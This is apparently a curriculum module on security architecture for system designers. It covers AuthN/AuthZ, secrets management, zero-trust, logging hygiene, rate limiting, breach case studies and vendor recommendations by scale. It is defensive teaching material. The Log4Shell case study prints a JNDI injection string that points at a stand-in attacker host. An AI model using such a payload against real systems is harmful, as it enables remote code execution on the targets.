name: Phase 12 · Security & Auth
short: Authentication, authorization, and data protection — the three concerns that are cheap to build in on day one and catastrophically expensive to retrofit later

detail.what: Security in system design covers three deeply intertwined concerns that together determine whether your users' data stays safe and your system stays trustworthy: (1) Authentication (AuthN) — proving who you are. This is the 'login' layer: passwords verified against bcrypt hashes, OAuth2 flows with Google/GitHub, magic links sent to email, hardware security keys (FIDO2/WebAuthn), and the tokens (JWT, session cookies) that prove 'this request comes from user 42 who authenticated 3 minutes ago.' The output of authentication is a verified identity. (2) Authorization (AuthZ) — deciding what you're allowed to do. Once we know you're user 42, can you read document X? Can you delete user 43? Can you access the admin panel? Authorization models range from simple RBAC (Role-Based Access Control: 'user 42 has the admin role, admins can delete users') to ABAC (Attribute-Based Access Control: 'user 42 can edit documents they created, in their own organization, during business hours') to policy engines like OPA (Open Policy Agent) that evaluate complex rules at runtime. (3) Data protection — ensuring that data is encrypted in transit (TLS), encrypted at rest (disk-level or field-level encryption), that encryption keys are managed securely (never in source code, always in a secrets manager like Vault or AWS KMS), and that sensitive data (PII, credentials) never leaks through logs, error messages, analytics, or backups. Beyond these three pillars, operational security includes: secure development lifecycle (dependency scanning, SAST/DAST, code review for auth logic), vulnerability management (patching known CVEs within 24–72 hours), and incident response (how you detect, contain, and communicate a breach). Security is not a feature you add — it's a property of every decision you make, from 'how do I store this password' to 'who can access the production database' to 'what happens when an employee laptop is stolen.'
detail.why: Security failures are existential, not just expensive. The average cost of a data breach is $4.45M (IBM Cost of a Data Breach Report 2023), but that average masks the bimodal distribution: most breaches cost $100K–$500K in direct costs (incident response, notification, legal), while mega-breaches (Equifax: $1.4B settlement, Marriott: $124M fine, Yahoo: reduced acquisition price by $350M) can threaten the company's existence. Beyond direct costs, breaches destroy trust: 65% of consumers lose trust in a company after a breach (Ponemon), and in competitive markets, trust is the only moat. The cheapest time to add security is the first day of development. Adding authentication after launch means retrofitting every endpoint. Adding encryption at rest after you've stored 5TB of unencrypted PII means a months-long migration with data-loss risk. Adding audit logging after a compliance audit fails means reconstructing months of history from application logs that weren't designed for it. The good news: 90% of breaches come from the same handful of mistakes — weak or missing authentication (credential stuffing, broken auth), unpatched known vulnerabilities (the Equifax breach was a known Apache Struts CVE that was unpatched for 2 months), leaked secrets (AWS keys on GitHub), and misconfigured cloud storage (public S3 buckets). Cover these well and you're ahead of most companies regardless of size. Security is one of the few areas where 'doing the basics well' provides 90% of the protection at 10% of the cost of doing everything.
detail.numbers: Critical security parameters every engineer should know: Password hashing: use bcrypt with cost factor ≥12 (each hash takes ~300ms, making brute force against a stolen database infeasible — at cost 12, an attacker with a GPU cluster can test ~10K hashes/second, meaning cracking a single strong password takes centuries). Alternatives: scrypt (memory-hard, good for password hashing), Argon2id (winner of the Password Hashing Competition 2015, the current best practice — memory-hard + CPU-hard, configurable for your hardware). Token expiry: access tokens (JWT) 15 minutes (short-lived to limit damage if stolen), refresh tokens 7–30 days (stored securely, rotated on use), session cookies httpOnly + secure + SameSite=Strict. Auth endpoint rate limiting: 5 login attempts per minute per IP, 20 per hour per account (prevents both distributed and targeted credential stuffing). After 5 failures, require CAPTCHA or progressive delays. TLS: enforce TLS 1.2 minimum (TLS 1.0/1.1 have known vulnerabilities), prefer TLS 1.3 (faster handshake, stronger ciphers, no known attacks). HSTS (HTTP Strict Transport Security) header: preload your domain so browsers never even attempt HTTP. Secrets rotation: API keys every 90 days, service account credentials every year, immediately upon any suspected exposure (automated rotation via Vault reduces this from a manual process to a config change). MFA reduces account takeover by ~99.9% (Microsoft data, based on analysis of billions of authentications). Even SMS-based 2FA (the weakest form) blocks 96% of bulk phishing attacks. FIDO2/WebAuthn hardware keys (YubiKey, Apple Passkeys) are phishing-proof — the strongest consumer authentication available.
detail.keyInsight: The fundamental principle of security architecture is defense in depth: no single control should be the only thing standing between an attacker and your data. Authentication can be bypassed (stolen credentials); so you need authorization (the stolen credential shouldn't grant universal access). Authorization can be misconfigured (a bug gives admin access to all users); so you need encryption at rest (even with data access, encrypted data is useless without the key). Encryption keys can be stolen (from a compromised server); so you need audit logging (you'll know within hours, not months, that a breach occurred). Each layer compensates for the failures of others. A system with only one security layer is one bug away from total compromise. A system with four layers requires four simultaneous failures — which is exponentially less likely.

tradeoffs.left: Strict security (MFA required, short session expiry, re-auth for sensitive actions) creates friction: users abandon signups, get logged out frequently, and complain about too many verification steps
tradeoffs.right: Permissive security (no MFA, long sessions, minimal re-verification) creates smooth UX but dramatically increases risk: credential stuffing succeeds, stolen devices grant persistent access, and social engineering attacks work

tradeoffs.left: Custom auth system gives you full control over the login flow, token format, session management, and user data storage — but every line of auth code you write is a potential vulnerability. Auth is one of the highest-risk, most-audited, most-attacked surfaces in any system
tradeoffs.right: Standard providers (Auth0, Clerk, Cognito, Firebase Auth) handle the hardest parts — password storage, OAuth flows, MFA, session management, security patches — and they're battle-tested against billions of login attempts. You give up some control and pay $0.01–0.10 per active user, but you buy the security expertise of a dedicated team

tradeoffs.left: Zero-trust (every request authenticated and authorized, even internal) is the security model of the 2020s — it assumes any network, device, or identity could be compromised. Higher implementation cost (mTLS everywhere, per-request policy evaluation) but survives insider threats and lateral movement
tradeoffs.right: Perimeter trust ('inside our VPC is safe') is simpler to implement but fails catastrophically when the perimeter is breached — a single compromised service gives the attacker full access to everything inside. The 2020 SolarWinds attack and the 2023 Okta breach both demonstrated that perimeter trust is an outdated model

pitfalls.name: Rolling your own crypto or auth system
pitfalls.desc: This is the cardinal sin of security engineering. You think: 'OAuth2 is just redirecting URLs and exchanging tokens — how hard can it be?' Extremely hard. OAuth2 alone has dozens of subtle attack vectors: CSRF on the redirect, open redirect vulnerabilities, token substitution attacks, PKCE bypass, token replay, audience confusion. And that's just one protocol. Homegrown password storage might use MD5 or SHA-256 (fast, GPU-crackable), skip salt or pepper, or have a timing attack in the comparison. Homegrown JWT validation might not check the 'alg' header (allowing an attacker to sign with 'none'), not validate the 'iss' and 'aud' claims, or be vulnerable to key confusion between RSA and HMAC. These bugs don't show up in functional testing — they show up in security audits and breach investigations. Use Auth0 ($23/month for 1K MAU, $228/month for 10K MAU — handles social login, MFA, passwordless, session management, and patches CVEs within hours), Clerk ($0–$25/month, excellent developer experience, React/Next.js focused), AWS Cognito ($0.0055/MAU after free tier of 50K — cheapest for AWS-heavy stacks), or Supabase Auth (free with Supabase, simpler than Auth0 but fewer enterprise features). Alternatives for self-hosted: Keycloak (open source, Java-based, feature-rich but operationally heavy), Authentik (open source, Python/Django, lighter than Keycloak), or better yet — use a battle-tested library in your framework: Devise (Rails), NextAuth.js (Next.js), Flask-Login + Flask-OAuthlib (Python). The only exception to 'never build your own' is at hyper scale (>100M users) where the specific requirements of your product genuinely can't be met by existing solutions — and even then, use well-audited cryptographic primitives (libsodium, ring for Rust, crypto/subtle in Go), never implement your own.

pitfalls.name: Secrets in environment variables, then committed to git
pitfalls.desc: The progression of a security disaster: (1) You start with a .env file containing AWS_ACCESS_KEY, STRIPE_SECRET, DATABASE_URL. (2) .env is in .gitignore but someone copies the values to docker-compose.yml, which IS committed. (3) Or someone sets the env var in the CI/CD config which is stored in the repo. (4) Or .env itself gets committed accidentally during a merge conflict resolution. Within 12 minutes (the average time bots take to find secrets on GitHub, per research by GitGuardian), automated scrapers have found your AWS keys and are spinning up GPU instances for crypto mining. AWS sends you a $40K bill and a 'your account may be compromised' email. This scenario plays out thousands of times per year — GitGuardian reports 10M+ secrets exposed on GitHub annually. The fix: use a secrets manager from day 1. Options by scale: Doppler ($0–$18/dev/month, syncs secrets to all environments, great DX, easy to adopt), AWS Secrets Manager ($0.40/secret/month + $0.05/10K API calls), HashiCorp Vault (open source, the most powerful and flexible, but operationally demanding — run the managed version HCP Vault for $0.03/hr if you don't want to operate it yourself), or 1Password's secret management (uses their vault infrastructure to inject secrets at runtime). Additionally: install a pre-commit hook that scans for secrets before they can be committed. GitGuardian has a free pre-commit scanner; gitleaks and TruffleHog are popular open-source alternatives. Enable GitHub's built-in secret scanning (free for public repos, available for enterprise). These are defense-in-depth: the secrets manager prevents the need to have secrets in files at all, and the pre-commit hook catches them if someone bypasses the manager.

pitfalls.name: Trusting the network perimeter ('inside our VPC is safe')
pitfalls.desc: Your mental model: the VPC is a castle with thick walls, and everything inside is trusted. Reality: the castle analogy hasn't been true since ~2015. An attacker who compromises one service through a dependency vulnerability, a stolen SSH key, a supply chain attack, or even a phished employee credential has full access to every other service inside the VPC. Internal traffic is unencrypted (see Phase 10 pitfall about TLS termination at the LB), there's no authentication between services, and there's no authorization checking on internal API calls. The SolarWinds attack (2020) demonstrated this at planetary scale: attackers gained access to thousands of organizations' internal networks through a compromised software update and moved laterally without resistance. The modern alternative is zero-trust architecture (pioneered by Google as BeyondCorp in 2014): every request is authenticated and authorized regardless of network location. Implementation: (1) mTLS between all services (service mesh like Linkerd or Istio handles this automatically), (2) per-request authorization using a policy engine like OPA (Open Policy Agent) — each service checks 'is this caller allowed to make this specific request?', (3) service identities (not just network IPs) for access control, (4) no VPN — users access applications through an identity-aware proxy that authenticates every request. Technologies: for managed zero-trust access — Cloudflare Access ($0–$3/user/month, replaces VPN for employee access to internal tools), Tailscale ($0–$5/user/month, WireGuard-based mesh VPN with identity-aware ACLs), or Google BeyondCorp Enterprise ($6/user/month). For service-to-service zero-trust: Istio mTLS + OPA, or Linkerd mTLS + custom auth middleware.

pitfalls.name: Logs containing PII, passwords, or credentials
pitfalls.desc: A developer adds request body logging for debugging: 'console.log(req.body)' or 'logger.info({request: req.body}).' Now every login request has the user's password in plaintext in your logs. Every profile update has their full name, email, and address. Every payment request has their credit card number. These logs flow to CloudWatch, then to Splunk, then to a dev machine for analysis, then to an S3 bucket for backup — each copy is a potential leak vector that exists for months or years. GDPR considers log data containing PII as a data copy subject to right-to-erasure requests — good luck finding and deleting specific user data from 500 log shards across 3 systems. The fix is structural, not procedural: (1) Never log full request/response bodies. Log a summary: {endpoint, method, status_code, duration_ms, user_id, error_code}. (2) Implement a log sanitizer in your logging middleware that strips or masks known PII fields (email → j***@e***.com, credit_card → ****1234). Libraries: pino-redact (Node.js), loguru with custom serializers (Python), Serilog.Enrichers.Sensitive (.NET). (3) In Sentry/error tracking, configure data scrubbers to mask passwords, tokens, and credit card numbers in stack traces and breadcrumbs. (4) Establish a rule: log user_id (a pseudonym), never name, email, or phone directly.

pitfalls.name: No rate limiting on authentication and expensive endpoints
pitfalls.desc: Your login endpoint has no rate limit. An attacker writes a script that tries 1,000 common passwords against every email address in a leaked database (available for $5 on the dark web). At 100 attempts per second, they've tested 100K credentials in 17 minutes. With a typical 0.1–1% hit rate (users who reuse passwords from other breaches), they've compromised 100–1,000 accounts. This is credential stuffing, and it's the #1 attack vector against web applications (Verizon Data Breach Report 2023). Similarly: your search endpoint has no rate limit, so a competitor scrapes your entire product catalog. Your password reset has no rate limit, so an attacker email-bombs a target user with 10,000 reset emails. Your /signup has no rate limit, so a bot creates 100K fake accounts. Fixes: (1) Rate limit authentication endpoints aggressively: 5 attempts/minute/IP AND 20 attempts/hour/account. After exceeding: require CAPTCHA (hCaptcha, free), then temporary lockout. (2) Rate limit by user/API-key for authenticated endpoints (see Phase 3 Rate Limiting). (3) For password reset: rate limit to 3 requests/hour/email AND implement a global rate limit (1,000 reset emails/hour total — if your entire user base isn't resetting passwords, something's wrong). (4) For signup: rate limit + email verification + CAPTCHA on suspicious patterns. Technologies: for instant protection with minimal code, put Cloudflare in front (the free tier includes basic rate limiting; the $20/month Pro tier includes sophisticated bot management and more configurable rate limiting rules).

pitfalls.name: Storing sensitive data without field-level encryption or tokenization
pitfalls.desc: Your database stores credit card numbers, SSNs, and medical records in plaintext columns. Yes, the database disk is encrypted (RDS default), and yes, TLS protects data in transit. But anyone with read access to the database (developers with production access, admin tools, database dumps for staging, analytics pipelines, read replicas) can see every sensitive value. A SQL injection vulnerability, a compromised admin account, or a backup tape that falls off a truck exposes everything. The solution is defense-in-depth at the data level: (1) Field-level encryption for medium-sensitivity data (date of birth, address): encrypt the column value with a per-field key managed by AWS KMS or Vault. The database stores ciphertext; the application decrypts at read time. (2) Tokenization for high-sensitivity data (credit cards, SSNs): replace the real value with a random opaque token. The real value is stored only in a dedicated vault (Stripe processes credit cards this way — merchant systems never see the real card number). (3) For truly sensitive data subject to compliance (PCI-DSS for credit cards, HIPAA for medical records): use a specialized vault service like Skyflow ($0.01–0.05/API call, purpose-built data vault with access policies, audit logging, and compliance certifications) or build on top of HashiCorp Vault Transit backend (encrypts/decrypts data via API without the application ever touching the raw key).

examples.name: Equifax breach (2017) — the $1.4B cost of not patching a known vulnerability
examples.desc: In March 2017, Apache disclosed a critical vulnerability in the Struts web framework (CVE-2017-5638). A patch was available the same day. Equifax, which used Struts for a consumer-facing web application, did not apply the patch. In May 2017 — two months later — attackers exploited the unpatched vulnerability and gained access to Equifax's network. They exfiltrated the personal data of 147 million people (SSNs, birth dates, addresses, driver's license numbers) over 76 days before being detected. The consequences: $1.4B in settlement costs, the CEO/CIO/CSO all resigned, Equifax's stock dropped 35%, and it became the textbook example of security failure. The lesson for system designers: (1) Automated dependency scanning is non-negotiable. Tools: GitHub Dependabot (free, automatically creates PRs to update vulnerable dependencies), Snyk ($0–$25/dev/month, deeper analysis including transitive dependencies and container images), Trivy (open source, scans container images, filesystem, and git repos). (2) Critical CVEs must be patched within 24–72 hours, not 'next sprint.' Have a fast-track deployment process for security patches that bypasses normal release gates. (3) If you can't patch immediately, deploy a WAF rule to block the exploit pattern as a temporary mitigation — Cloudflare's free WAF rules would have blocked this specific attack.

examples.name: Google's BeyondCorp — zero-trust at internet scale, and why VPNs are dead
examples.desc: In 2014, Google published the BeyondCorp paper describing how they eliminated the concept of a 'privileged internal network.' Every Google employee accesses internal tools over the public internet, through an identity-aware proxy that verifies their identity (certificate on device + password + MFA), their device health (patched, encrypted, managed), and their authorization for the specific resource they're accessing. There is no VPN. The rationale: Google realized after a sophisticated state-sponsored attack (Operation Aurora, 2009) that the traditional model (trust inside the network, distrust outside) was fundamentally broken. An attacker who gets inside the VPN has the same access as a trusted employee. BeyondCorp makes every request prove its legitimacy regardless of network location. For your system: (1) Replace VPN for internal tool access with Cloudflare Access ($0 for up to 50 users on the free plan, $3/user/month on the Teams plan) or Tailscale ($0 for personal, $5/user/month for teams — a WireGuard-based mesh that acts like a VPN but with identity-aware ACLs). Both are trivially easy to set up compared to a traditional VPN and dramatically more secure. (2) For service-to-service: deploy mTLS via service mesh (see Phase 10) and per-request authorization via OPA.

examples.name: The 2023 Okta support breach — supply chain risk and session token theft
examples.desc: In October 2023, attackers compromised Okta's customer support system and accessed customer-uploaded HAR files (HTTP Archive files used for debugging) that contained session tokens. With those tokens, attackers accessed several Okta customers including BeyondTrust, Cloudflare, and 1Password. Cloudflare detected and blocked the intrusion within 24 minutes because they (1) monitored for anomalous use of session tokens (token used from a new geographic location → automatic session invalidation), (2) used hardware security keys for all employee authentication (the stolen session token couldn't be used to escalate privileges because MFA was required for sensitive actions), and (3) had comprehensive audit logging that flagged the suspicious access immediately. The lesson: even your authentication provider can be compromised. Defense in depth means: short token expiry (limit the damage window), anomaly detection on token usage (flag impossible travel or device changes), hardware MFA for sensitive operations (unphishable even if sessions are stolen), and comprehensive audit logging so you detect breaches in minutes, not months.

examples.name: The Log4Shell vulnerability (December 2021) — why dependency management is security
examples.desc: CVE-2021-44228 (Log4Shell) was a critical remote code execution vulnerability in Apache Log4j, a Java logging library used by virtually every Java application on Earth. An attacker could achieve full remote code execution by simply sending a crafted string (like '${jndi:ldap://attacker.com/x}') anywhere it would be logged — a username field, a search query, a User-Agent header. The entire internet was vulnerable for days. Companies that survived unscathed shared two characteristics: (1) They knew exactly which of their services used Log4j (they maintained a Software Bill of Materials / SBOM) and could prioritize patching. (2) They could deploy patches within hours, not days (they had fast-track security deployment pipelines). Companies that suffered had the opposite: no dependency inventory, no ability to quickly audit transitive dependencies, and deployment processes that required days of approval. Build these capabilities: (a) Use 'snyk test' or 'npm audit' / 'pip-audit' / 'mvn dependency-check' in your CI pipeline to block builds with known vulnerable dependencies. (b) Maintain a dependency inventory (SBOM) so you can answer 'which of our services use library X?' within minutes. (c) Have a security-fast-track deployment path that bypasses normal gates for critical patches.

levelUp.trigger: You have any third-party integrations requiring API keys, or you process any user PII, or a customer asks about your security practices (e.g., during a sales process for a B2B deal)
levelUp.action: Step 1: If you haven't already, migrate from DIY auth to a managed provider. Auth0 or Clerk for most applications — this gives you OAuth2 social login (Google, GitHub, etc.), MFA, session management, and security patches handled by experts. Typical migration from Passport.js/Devise to Auth0: 2–5 days. Step 2: Implement JWT-based API authentication with proper validation: check signature (use asymmetric RS256, not symmetric HS256 — the public key can be safely distributed to any service that needs to validate tokens), check expiry (exp claim), check issuer (iss) and audience (aud). Access tokens expire in 15 minutes; refresh tokens in 7–30 days with rotation. Step 3: Move all secrets to a secrets manager. Easiest migration path: Doppler (signup, run 'doppler setup' in your project, replace process.env.SECRET with Doppler's injected values — takes ~30 minutes per project). Step 4: Set up API key management for external integrations — issue per-integration keys with explicit scopes, store hashed in your DB (never plaintext), and build a revocation endpoint. Step 5: Add basic audit logging — log every authentication event (login, logout, password change, MFA enrollment), every authorization failure (403s), and every access to PII. Store separately from application logs with longer retention (1 year minimum). Step 6: Run the OWASP Top 10 checklist against your application before any public launch — it covers the 10 most common web application vulnerabilities (injection, broken authentication, sensitive data exposure, etc.). This is a manual review that takes 1–2 days and catches 80% of security issues.

levelUp.trigger: >100 internal services making authentication/authorization complex, or first SOC 2 Type I/II audit, or enterprise customers requiring security questionnaires
levelUp.action: Step 1: Implement zero-trust service-to-service authentication via mTLS. If you have a service mesh (Istio, Linkerd — see Phase 10), this is automatic. If not, deploy Linkerd (the lightest option: 'linkerd install | kubectl apply -f -', then 'linkerd inject' your deployments). Every service now has a cryptographic identity (X.509 certificate) and every call is encrypted and mutually authenticated. Step 2: Deploy a centralized authorization policy engine. OPA (Open Policy Agent, open source from Styra) lets you write authorization rules in a declarative language (Rego) that's evaluated at request time by each service. Example policy: 'allow if input.user.role == "admin" and input.action == "delete"' or 'allow if input.resource.owner == input.user.id'. OPA runs as a sidecar or library, evaluating policies in <1ms. Step 3: Move ALL secrets to HashiCorp Vault (open source, or HCP Vault managed at $0.03/hr). Implement automatic secret rotation: Vault can rotate database credentials, API keys, and cloud IAM credentials on a schedule without application changes (using Vault's dynamic secrets feature). Step 4: Set up automated vulnerability scanning in CI/CD: Snyk or Trivy scans every build for known vulnerabilities in dependencies and container images. Block merges/deploys that introduce critical or high vulnerabilities without explicit security team override. Step 5: Prepare for SOC 2: this is a security audit standard that enterprise customers increasingly require. The core requirements: access controls, encryption, monitoring, incident response, and vendor management. Use Vanta ($10K+/year, automates evidence collection for SOC 2/ISO 27001/HIPAA by connecting to your cloud accounts and pulling compliance data automatically) or Drata (similar, $10K+/year) to dramatically reduce the audit preparation burden — what used to take 6 months of manual documentation can be done in 6 weeks with automated evidence collection. Step 6: Deploy a SIEM (Security Information and Event Management) for security-specific monitoring: aggregate auth logs, access logs, and cloud audit trails (AWS CloudTrail, GCP Audit Logs) into one searchable system. Options: Datadog Cloud SIEM ($0.20/GB analyzed), Elastic SIEM (self-hosted, free but operationally demanding), or AWS GuardDuty ($4/million CloudTrail events — managed, detects unusual API calls, crypto mining, and credential exfiltration automatically).

levelUp.trigger: Nation-state threat model (government, defense, critical infrastructure), billions of user accounts, or operating in highly regulated industries (financial services, healthcare, government)
levelUp.action: Step 1: Build or deploy a custom identity platform capable of handling billions of user accounts with sub-50ms authentication latency globally. At this scale, managed providers (Auth0, Cognito) either can't handle the volume, are too expensive ($0.0055/MAU × 1B = $5.5M/month for Cognito alone), or don't provide the geographic distribution you need. Most companies at this tier build a custom OAuth2/OIDC server on top of proven libraries (ORY Hydra — open source, Go-based, high performance; or Spring Authorization Server for Java ecosystems). Shard the user database by user_id hash across regions for low-latency lookups. Step 2: Deploy FIDO2/WebAuthn as the primary authentication mechanism for high-value accounts and all employees. Hardware security keys (YubiKey at $25–$70/key) are phishing-proof — unlike TOTP codes or SMS which can be intercepted, a hardware key cryptographically proves the user is on the legitimate site. Apple Passkeys and Google Passkeys bring the same cryptographic guarantees to consumer devices without a physical dongle. At hyper scale, phishing is the #1 attack vector against employee accounts — hardware keys eliminate it. Step 3: Implement continuous authentication using behavioral analysis — instead of authenticating once at login and trusting the session forever, continuously evaluate risk signals: geographic location change (user was in NYC, now accessing from Lagos — challenge with MFA), device change, access pattern anomaly (user normally accesses 3 repos, suddenly accessing 50 — flag for review), impossible travel (login from Tokyo and London 30 minutes apart). Technologies: custom ML models on login telemetry, or commercial solutions like Microsoft Entra (includes risk-based conditional access). Step 4: Deploy advanced threat detection: (a) runtime application security (RASP) that detects and blocks attacks from inside the application (Sqreen, now part of Datadog), (b) cloud security posture management (CSPM) that continuously audits your cloud configuration for misconfigurations (AWS Security Hub, Wiz at $100K+/year, or Prowler open source), (c) insider threat detection via UEBA (User and Entity Behavior Analytics) that baselines normal behavior and alerts on deviations. Step 5: Establish a dedicated security team with specializations: AppSec (application security — code review, threat modeling, pen testing), InfraSec (infrastructure security — cloud config, network security, secret management), SecOps (security operations — incident response, threat detection, vulnerability management), and GRC (governance, risk, and compliance — audit management, policy writing, regulatory interface). The ratio at this tier: roughly 1 security engineer per 8–10 product engineers, with additional dedicated compliance and incident response staff.

defined_terms.AuthN vs AuthZ: Authentication (AuthN) proves identity ('who are you?'). Authorization (AuthZ) checks permissions ('what can you do?'). They're separate concerns that are often conflated. You can be authenticated (proven to be user 42) but not authorized (user 42 doesn't have admin privileges).
defined_terms.OAuth2: An authorization framework (RFC 6749) that allows a user to grant a third-party application limited access to their account on another service without sharing their password. The flow: app redirects user to provider (Google), user approves, provider sends an authorization code back to the app, app exchanges the code for an access token. The app never sees the user's Google password.
defined_terms.JWT: JSON Web Token — a compact, self-contained token format that encodes claims (user_id, roles, expiry) in a digitally signed JSON payload. The signature lets any service verify the token without calling an auth server. Tradeoff: JWTs can't be revoked before expiry (they're self-contained), so keep expiry short (15 min) and use refresh tokens for long-lived sessions.
defined_terms.mTLS: Mutual TLS — both client and server present X.509 certificates and verify each other's identity. Standard TLS only authenticates the server (the padlock in your browser). mTLS authenticates both sides, establishing cryptographic identity for service-to-service calls.
defined_terms.Zero-trust: A security model that assumes no implicit trust based on network location. Every request must be authenticated and authorized, whether it comes from inside or outside the network perimeter. Coined by Forrester Research (2010), popularized by Google's BeyondCorp implementation (2014).
defined_terms.RBAC / ABAC: Role-Based Access Control: permissions assigned to roles (admin, editor, viewer), users assigned to roles. Simple, works well for most applications. Attribute-Based Access Control: permissions evaluated based on attributes of the user, resource, action, and environment ('user in engineering department can edit documents tagged engineering during business hours'). More flexible but more complex to implement and audit.
defined_terms.Secrets manager: A dedicated service for storing, accessing, and rotating sensitive configuration values (API keys, database passwords, encryption keys). Unlike environment variables, a secrets manager provides: access control (who can read which secret), audit logging (who accessed which secret when), automatic rotation, and encryption at rest. Examples: HashiCorp Vault, AWS Secrets Manager, Doppler.

small.range: Session-based auth or JWT, basic password hashing, HTTPS
small.rec: The security foundation every application must have before going to production, regardless of size: (1) Password hashing with bcrypt (cost 12) or Argon2id — NEVER MD5, SHA-256, or any fast hash. Libraries: bcryptjs (Node.js), passlib (Python), BCrypt (Ruby). Or better: use a managed auth provider and don't store passwords at all. Auth0 free tier handles 7K MAU; Clerk free tier handles 10K MAU; Supabase Auth is free with Supabase. (2) HTTPS everywhere via Let's Encrypt — Caddy does this automatically (zero config), or use certbot with Nginx. Add HSTS header to prevent HTTP downgrade attacks. (3) Rate limit the login endpoint: 5 attempts/min/IP. rack-attack (Rails), express-rate-limit (Node.js), flask-limiter (Python). (4) Basic RBAC: at minimum two roles (admin/user). Enforce in middleware, not ad-hoc in controllers. (5) CSRF protection enabled (most frameworks include this by default — Rails, Django, Laravel all have it on by default; verify it's not disabled). (6) Security headers: Content-Security-Policy, X-Content-Type-Options, X-Frame-Options. Use helmet.js (Node.js/Express) or secure_headers (Rails) to set all of them in one line. (7) Run 'npm audit' / 'pip-audit' / 'bundle-audit' in CI — block deploys with known critical vulnerabilities. Technology comparison for managed auth: Auth0 (most features — social login, passwordless, MFA, enterprise SSO, $23/month for 1K MAU, the industry standard) vs Clerk ($25/month for 10K MAU, best developer experience for React/Next.js, beautiful prebuilt UI components) vs Firebase Auth (free for unlimited email/password users, tight Google ecosystem integration, but limited customization) vs Supabase Auth (free, open source, Postgres-based, good for Supabase users) vs AWS Cognito ($0.0055/MAU after 50K free tier, cheapest at scale but worst developer experience — config is complex and error messages are unhelpful).

medium.range: OAuth2 social login + JWT + API key management + secrets manager
medium.rec: Expanding security for a growing application with external integrations and multiple services: (1) OAuth2 social login (Google, GitHub, Microsoft) — dramatically improves signup conversion (users don't have to create yet another password) and offloads password security to providers with enormous security teams. If using Auth0 or Clerk, this is a toggle. If DIY: Passport.js (Node.js), OmniAuth (Rails), social-auth-app-django (Python). (2) JWT with refresh tokens: access token (15-min expiry, includes user_id and roles, signed with RS256 asymmetric key), refresh token (7–30 day expiry, stored in httpOnly cookie, rotated on every use — old refresh token immediately invalidated to prevent token theft). (3) API key management for third-party integrations: generate per-integration keys with explicit scopes (read:orders, write:products), store the key hashed in your DB (bcrypt or SHA-256 with salt — the key itself is shown to the user only once at creation), and build a revocation endpoint. (4) Move all secrets to a secrets manager. Doppler ($0–$18/dev/month, easiest migration path — 30 minutes per project, syncs to all environments) or HashiCorp Vault ($0 for open source, $0.03/hr for HCP managed — more powerful but steeper learning curve). Stop using .env files in production. (5) Role-Based Access Control with at least 3 tiers (admin, member, viewer) plus resource-level ownership checks ('can only edit documents you created'). Technologies: Casbin (open source policy engine, supports RBAC/ABAC/ACL, available for Go/Java/Node/Python/Rust), or CASL (Node.js, frontend-friendly). (6) Enable MFA: at minimum, offer TOTP (Google Authenticator, Authy) for all users and require it for admin accounts. Auth0/Clerk handle MFA out of the box.

large.range: Zero-trust network + mTLS between services + centralized RBAC/ABAC + SOC 2 compliance
large.rec: At this scale, security becomes a formal engineering discipline with dedicated practices: (1) Zero-trust internal networking: deploy mTLS between all services via service mesh (Linkerd recommended for most organizations — lighter than Istio, 5-minute install, automatic mTLS). Every internal call is encrypted and mutually authenticated. No more 'inside the VPC is safe.' (2) Centralized policy engine: OPA (Open Policy Agent, open source by Styra) — define authorization rules in Rego policy language, evaluate at request time from any service. Example: an API gateway policy that checks 'does this user's JWT contain a role that's permitted to access this endpoint at this HTTP method?' OPA evaluates in <1ms and can be deployed as a sidecar, library, or centralized service. Alternatives: Cerbos (open source, more opinionated than OPA, YAML-based policies — easier to write than Rego), Cedar (Amazon's new policy language, open source, used by AWS Verified Permissions). (3) Secrets management with automatic rotation: HashiCorp Vault's dynamic secrets feature can generate short-lived database credentials on demand (each service gets unique credentials that expire in hours, rather than a shared password that lives forever). Vault also handles encryption-as-a-service (transit engine), PKI certificate issuance (for mTLS), and cloud IAM credential rotation. (4) SOC 2 Type II compliance: use Vanta or Drata ($10K+/year) to automate evidence collection. They connect to your AWS account, GitHub, Jira, HR system, and automatically verify controls: 'are all S3 buckets encrypted?', 'do all repos require code review?', 'are all employees using MFA?' The audit itself is conducted by a CPA firm ($15–50K depending on scope). SOC 2 is increasingly table stakes for selling to enterprise — start the process 3–6 months before you need the report. (5) SIEM for security monitoring: aggregate CloudTrail, VPC flow logs, auth logs, and application security events. AWS GuardDuty ($4/M CloudTrail events, managed) detects crypto mining, credential exfiltration, and unusual API patterns automatically. Splunk ($150/GB/day ingested) or Datadog Cloud SIEM ($0.20/GB) for more sophisticated correlation and custom detection rules.

hyper.range: Custom identity platform + hardware security keys + continuous authentication + ML threat detection + dedicated security team
hyper.rec: At this tier, you're defending against sophisticated, persistent attackers (organized crime, nation-states) and operating under intense regulatory scrutiny. (1) Custom identity platform: Auth0 and Cognito can't handle billions of users at acceptable cost or latency. Build a custom OAuth2/OIDC server using ORY Hydra (open source, Go, high-performance, designed for cloud-native) or Keycloak (Java, more features but heavier) as the foundation. Shard the user identity database by user_id across regions. Deploy in every region for sub-50ms authentication. (2) FIDO2/WebAuthn everywhere: require hardware security keys (YubiKey 5 series, $45/key) for all employee accounts and privileged operations. Offer Apple/Google Passkeys as a phishing-resistant option for consumer accounts. At this scale, phishing is the #1 attack vector — hardware keys eliminate it entirely. (3) Continuous authentication: deploy ML models that evaluate risk signals on every request — geographic anomaly (impossible travel), device fingerprint change, behavioral deviation (user accessing resources outside their normal pattern), time anomaly (access at 3am when user is always active 9–5). High-risk signals trigger step-up authentication (re-verify with hardware key) or session termination. Technologies: custom models on your telemetry data, or Microsoft Entra risk-based conditional access. (4) Hardware Security Modules (HSMs) for cryptographic key management: AWS CloudHSM ($1.60/hr) or Google Cloud HSM for FIPS 140-2 Level 3 compliance. All encryption keys (data encryption, token signing, TLS) stored in HSMs — keys never exist in software. Required for PCI-DSS Level 1, FedRAMP High, and financial services regulations. (5) Red team / purple team exercises: hire or contract a red team (offensive security professionals who attempt to breach your system using the same techniques as real attackers) quarterly. Purple team = red team + blue team (your defenders) working together so both sides learn. Companies like Synack ($100K+/year) provide on-demand red teaming; alternatively, run an internal bug bounty program via HackerOne or Bugcrowd ($0 platform fee for managed programs, you pay per valid bug — typically $500–$10K per vulnerability depending on severity). (6) Dedicated security team structure: AppSec (secure code review, threat modeling, SAST/DAST), InfraSec (cloud security, network security, Vault/PKI management), SecOps (SIEM monitoring, incident response, threat intelligence), Identity (the identity platform team), GRC (audit, compliance, policy). Total security headcount at this tier: typically 1 security engineer per 8–10 product engineers, plus dedicated leadership.
